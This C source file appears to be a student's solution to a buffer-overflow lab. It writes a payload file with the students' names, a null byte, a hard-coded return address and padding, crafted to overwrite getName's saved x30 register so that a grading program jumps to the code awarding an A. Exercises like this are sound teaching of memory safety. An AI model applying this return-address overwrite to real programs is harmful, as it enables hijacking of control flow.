/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Ariel Yuan, Grace Best.                                    */
/* Purpose: "Produces a file called dataA with the student name, a    */
/* nullbyte, the address of the malicious instruction in an array     */
/* element of name[] to get an A, which will overwrite getName's      */
/* stored x30 and padding to overrun the stack.                       */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <miniassembler.h>

/* This is supposed to be the comment before main? Returns 0.  */

FILE *psFILE;
int main(void)
{
    int i;
    unsigned long ulData = 0x420068;   // Address of A instruction
    psFILE = fopen("dataA", "w");
    fprintf(psFILE, "Ariel & Grace");   // Write our names to file
    fprintf(psFILE, "%c", '\0');     // Write null byte after name
    

    // Overwrite getName's stored x30 w/ instruction to get a A
    fwrite(&ulData, sizeof(unsigned long), 1, psFILE);

    // Write padding of 16(?) characters to overrun stack
    for (i = 0; i < 16; i++)
    {
        fprintf(psFILE, "%c", 'a');
    }

    fclose(psFILE);
    return 0;
}